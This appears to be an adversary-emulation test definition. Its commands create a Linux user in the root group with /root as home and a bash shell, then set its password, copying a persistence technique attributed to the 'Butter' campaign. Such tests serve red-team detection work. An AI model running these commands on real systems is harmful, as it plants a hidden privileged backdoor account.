name: Create a new user in Linux with `root` UID and GID.
description: Creates a new user in Linux and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.

data.command:
useradd -g 0 -M -d /root -s /bin/bash #{username}
if [ $(cat /etc/os-release | grep -i 'Name="ubuntu"') ]; then echo "#{username}:#{password}" | sudo chpasswd; else echo "#{password}" | passwd --stdin #{username}; fi;

input_arguments.name: username
input_arguments.description: Username of the user to create

input_arguments.name: password
input_arguments.description: Password of the user to create
